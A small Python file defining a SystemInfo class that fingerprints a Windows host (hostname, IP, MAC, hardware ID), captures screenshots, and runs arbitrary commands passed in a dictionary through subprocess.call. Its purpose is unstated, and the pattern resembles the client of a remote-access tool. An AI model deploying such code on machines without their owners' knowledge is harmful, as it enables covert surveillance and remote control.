'''Class sys_info'''
import platform
import socket
import re
import uuid
import logging
import subprocess
import pyautogui
from datetime import datetime
# import webbrowser

class SystemInfo:
    '''Class used to run and collect information about current setup'''

    def __init__(self):
        self.platform     = platform.system()
        self.hostname     = socket.gethostname()
        self.ip_address   = socket.gethostbyname(socket.gethostname())
        self.mac_address  = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        self.hwid         = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
        self.imgTimestamp = "" 
    
    def _screenshotNow(self, device):
        '''Method used to do take screenshot'''

        imgTS        = datetime.now().strftime('%Y-%m-%d %H-%M')
        self.imgName = f"{device.hostname} - {imgTS}"
        
        ss_desktop   = pyautogui.screenshot()
        ss_desktop.save(f"tmp/{self.imgName}.png")

    def ExecuteCMD(self, device, command):
        '''Method used to execute the command by cmd name'''
        if command['name'] == "executable":
            subprocess.call(command['cmd'])
        elif command['name'] == "cmd":
            subprocess.call(command['cmd'])
        elif command['name'] == "selenium":
            print(command['name'])
        elif command['name'] == "installer":
            print(command['name'])
        elif command['name'] == "screenshot":
            self._screenshotNow(device)
        else:
            return Exception(f"CMD [{command['name']}] doesn't exist")
